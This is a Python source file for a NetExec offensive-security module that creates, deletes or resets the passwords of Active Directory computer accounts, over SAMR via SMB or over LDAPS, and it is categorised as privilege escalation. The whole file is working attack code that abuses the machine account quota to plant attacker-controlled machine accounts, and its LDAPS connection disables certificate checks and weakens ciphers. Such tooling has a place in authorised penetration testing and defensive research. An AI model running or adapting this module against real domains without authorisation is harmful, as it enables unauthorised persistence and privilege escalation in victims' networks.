import ssl
import ldap3
import sys
from impacket.dcerpc.v5 import samr, epm, transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Module by CyberCelt: @Cyb3rC3lt
    Initial module:
        https://github.com/Cyb3rC3lt/CrackMapExec-Modules
    Thanks to the guys at impacket for the original code
    """

    name = "add-computer"
    description = "Adds or deletes a domain computer"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def options(self, context, module_options):
        """
        add-computer: Specify add-computer to call the module using smb
        NAME: Specify the NAME option to name the Computer to be added
        PASSWORD: Specify the PASSWORD option to supply a password for the Computer to be added
        DELETE: Specify DELETE to remove a Computer
        CHANGEPW: Specify CHANGEPW to modify a Computer password
        Usage: nxc smb $DC-IP -u Username -p Password -M add-computer -o NAME="BADPC" PASSWORD="Password1"
               nxc smb $DC-IP -u Username -p Password -M add-computer -o NAME="BADPC" DELETE=True
               nxc smb $DC-IP -u Username -p Password -M add-computer -o NAME="BADPC" PASSWORD="Password2" CHANGEPW=True
        """
        self.__noAdd = False
        self.__delete = False
        self.noLDAPRequired = False

        if "DELETE" in module_options:
            self.__delete = True

        if "CHANGEPW" in module_options and ("NAME" not in module_options or "PASSWORD" not in module_options):
            context.log.error("NAME  and PASSWORD options are required!")
            sys.exit(1)
        elif "CHANGEPW" in module_options:
            self.__noAdd = True

        if "NAME" in module_options:
            self.__computerName = module_options["NAME"]
            if self.__computerName[-1] != "$":
                self.__computerName += "$"
        else:
            context.log.error("NAME option is required!")
            sys.exit(1)

        if "PASSWORD" in module_options:
            self.__computerPassword = module_options["PASSWORD"]
        elif "PASSWORD" not in module_options and not self.__delete:
            context.log.error("PASSWORD option is required!")
            sys.exit(1)

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.__domain = connection.domain
        self.__domainNetbios = connection.domain
        self.__kdcHost = connection.kdcHost
        self.__username = connection.username
        self.__password = connection.password
        self.__host = connection.host
        self.__aesKey = connection.aesKey
        self.__doKerberos = connection.kerberos
        self.__nthash = connection.nthash
        self.__lmhash = connection.lmhash

        # First try to add via SAMR over SMB
        self.do_samr_add()

        # If SAMR fails now try over LDAPS
        if not self.noLDAPRequired:
            self.do_ldaps_add()

    def do_samr_add(self):
        """Connects to a target server and performs various operations related to adding or deleting machine accounts."""
        string_binding = epm.hept_map(self.__host, samr.MSRPC_UUID_SAMR, protocol="ncacn_np")
        string_binding = string_binding.replace(self.__host, self.__kdcHost) if self.__kdcHost else string_binding

        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.setRemoteHost(self.__host)

        if hasattr(rpc_transport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            rpc_transport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

        rpc_transport.set_kerberos(self.__doKerberos, self.__kdcHost)

        dce = rpc_transport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        samr_connect_response = samr.hSamrConnect5(dce, f"\\\\{self.__kdcHost}\x00", samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
        serv_handle = samr_connect_response["ServerHandle"]

        # Get the list of domains
        samr_enum_response = samr.hSamrEnumerateDomainsInSamServer(dce, serv_handle)
        domains = samr_enum_response["Buffer"]["Buffer"]
        domains_without_builtin = [domain for domain in domains if domain["Name"].lower() != "builtin"]
        if len(domains_without_builtin) > 1:
            domain = list(filter(lambda x: x["Name"].lower() == self.__domainNetbios, domains))
            if len(domain) != 1:
                self.context.log.fail(f"This domain does not exist: '{self.__domainNetbios}'")
                self.context.log.fail("Available domain(s):")
                for domain in domains:
                    self.context.log.fail(f" * {domain['Name']}")
                raise Exception
            else:
                selected_domain = domain[0]["Name"]
        else:
            selected_domain = domains_without_builtin[0]["Name"]

        domain_sid = samr.hSamrLookupDomainInSamServer(dce, serv_handle, selected_domain)["DomainId"]

        self.context.log.debug(f"Opening domain {selected_domain}...")
        domain_handle = samr.hSamrOpenDomain(dce, serv_handle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, domain_sid)["DomainHandle"]

        # Get handle for existing computer account
        if self.__noAdd or self.__delete:
            try:
                user_rid = samr.hSamrLookupNamesInDomain(dce, domain_handle, [self.__computerName])["RelativeIds"]["Element"][0]
            except samr.DCERPCSessionError as e:
                self.context.log.debug(f"samrLookupNamesInDomain failed: {e}")
                if "STATUS_NONE_MAPPED" in str(e):
                    self.context.log.fail(f"{self.__computerName} not found in domain {selected_domain}")
                    self.noLDAPRequired = True
                else:
                    self.context.log.fail(f"Unexpected error looking up {self.__computerName} in domain {selected_domain}: {e}")
                return

            if self.__delete:
                access = samr.DELETE
                message = "delete"
            else:
                access = samr.USER_FORCE_PASSWORD_CHANGE
                message = "set the password for"
            try:
                user_handle = samr.hSamrOpenUser(dce, domain_handle, access, user_rid)["UserHandle"]
            except samr.DCERPCSessionError as e:
                self.context.log.debug(f"samrOpenUser failed: {e}")
                if "STATUS_ACCESS_DENIED" in str(e):
                    self.context.log.fail(f"{self.__username} does not have the right to {message} {self.__computerName}")
                    self.noLDAPRequired = True
                else:
                    self.context.log.fail(f"Unexpected error opening {self.__computerName} in domain {selected_domain}: {e}")
                return
        # Add computer account
        else:
            try:
                samr.hSamrLookupNamesInDomain(dce, domain_handle, [self.__computerName])
                self.noLDAPRequired = True
                self.context.log.fail(f'Computer account already exists with the name: "{self.__computerName}"')
            except samr.DCERPCSessionError as e:
                self.context.log.debug(f"samrLookupNamesInDomain failed: {e}")
                if "STATUS_NONE_MAPPED" not in str(e):
                    self.context.log.fail(f"Unexpected error looking up {self.__computerName} in domain {selected_domain}: {e}")
                    return
            try:
                user_handle = samr.hSamrCreateUser2InDomain(
                    dce,
                    domain_handle,
                    self.__computerName,
                    samr.USER_WORKSTATION_TRUST_ACCOUNT,
                    samr.USER_FORCE_PASSWORD_CHANGE,
                )["UserHandle"]
                self.noLDAPRequired = True
                self.context.log.highlight(f"Successfully added the machine account: '{self.__computerName}' with Password: '{self.__computerPassword}'")
                self.context.db.add_credential("plaintext", self.__domain, self.__computerName, self.__computerPassword)
            except samr.DCERPCSessionError as e:
                self.context.log.debug(f"samrCreateUser2InDomain failed: {e}")
                if "STATUS_ACCESS_DENIED" in str(e):
                    self.context.log.fail(f"The following user does not have the right to create a computer account: {self.__username}")
                elif "STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED" in str(e):
                    self.context.log.fail(f"The following user exceeded their machine account quota: {self.__username}")
                return

        if self.__delete:
            samr.hSamrDeleteUser(dce, user_handle)
            self.context.log.highlight(f"Successfully deleted the '{self.__computerName}' Computer account")
            self.noLDAPRequired = True

            # Removing the machine account in the DB
            user = self.context.db.get_user(self.__domain, self.__computerName)
            user_ids = [row[0] for row in user]
            self.context.db.remove_credentials(user_ids)
        else:
            samr.hSamrSetPasswordInternal4New(dce, user_handle, self.__computerPassword)
            if self.__noAdd:
                self.context.log.highlight(f"Successfully set the password of machine '{self.__computerName}' with password '{self.__computerPassword}'")
                self.noLDAPRequired = True
            else:
                user_rid = samr.hSamrLookupNamesInDomain(dce, domain_handle, [self.__computerName])["RelativeIds"]["Element"][0]
                user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)["UserHandle"]
                req = samr.SAMPR_USER_INFO_BUFFER()
                req["tag"] = samr.USER_INFORMATION_CLASS.UserControlInformation
                req["Control"]["UserAccountControl"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                samr.hSamrSetInformationUser2(dce, user_handle, req)
                if not self.noLDAPRequired:
                    self.context.log.highlight(f"Successfully added the machine account '{self.__computerName}' with Password: '{self.__computerPassword}'")
                self.noLDAPRequired = True

            if user_handle is not None:
                samr.hSamrCloseHandle(dce, user_handle)
            if domain_handle is not None:
                samr.hSamrCloseHandle(dce, domain_handle)
            if serv_handle is not None:
                samr.hSamrCloseHandle(dce, serv_handle)
            dce.disconnect()

            self.context.db.add_credential("plaintext", self.__domain, self.__computerName, self.__computerPassword)

    def do_ldaps_add(self):
        """Performs an LDAPS add operation."""
        ldap_domain = f"dc={self.connection.domain.replace('.', ',dc=')}"

        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2, ciphers="ALL:@SECLEVEL=0")
        ldap_server = ldap3.Server(self.connection.host, use_ssl=True, port=636, get_info=ldap3.ALL, tls=tls)
        c = ldap3.Connection(ldap_server, f"{self.connection.username}@{self.connection.domain}", self.connection.password)
        c.bind()

        sAMAccountName = self.__computerName
        name = self.__computerName.rstrip("$")

        if self.__delete:
            result = c.delete(f"cn={name},cn=Computers,{ldap_domain}")
            if result:
                self.context.log.highlight(f'Successfully deleted the "{sAMAccountName}" Computer account')
            elif result is False and c.last_error == "noSuchObject":
                self.context.log.fail(f'Computer named "{sAMAccountName}" was not found')
            elif result is False and c.last_error == "insufficientAccessRights":
                self.context.log.fail(f'Insufficient Access Rights to delete the Computer "{sAMAccountName}"')
            else:
                self.context.log.fail(f'Unable to delete the "{sAMAccountName}" Computer account. The error was: {c.last_error}')
        else:
            spns = [
                f"HOST/{name}",
                f"HOST/{name}.{self.connection.domain}",
                f"RestrictedKrbHost/{name}",
                f"RestrictedKrbHost/{name}.{self.connection.domain}",
            ]
            result = c.add(
                f"cn={name},cn=Computers,{ldap_domain}",
                ["top", "person", "organizationalPerson", "user", "computer"],
                {
                    "dnsHostName": f"{name}.{self.connection.domain}",
                    "userAccountControl": 0x1000,
                    "servicePrincipalName": spns,
                    "sAMAccountName": sAMAccountName,
                    "unicodePwd": f'"{self.__computerPassword}"'.encode("utf-16-le")
                }
            )
            if result:
                self.context.log.highlight(f'Successfully added the machine account: "{sAMAccountName}" with Password: "{self.__computerPassword}"')
                self.context.log.highlight("You can try to verify this with the nxc command:")
                self.context.log.highlight(f"nxc ldap {self.connection.host} -u {self.connection.username} -p {self.connection.password} -M group-mem -o GROUP='Domain Computers'")
            elif result is False and c.last_error == "entryAlreadyExists":
                self.context.log.fail(f"The Computer account '{sAMAccountName}' already exists")
            elif not result:
                self.context.log.fail(f"Unable to add the '{sAMAccountName}' Computer account. The error was: {c.last_error}")
        c.unbind()
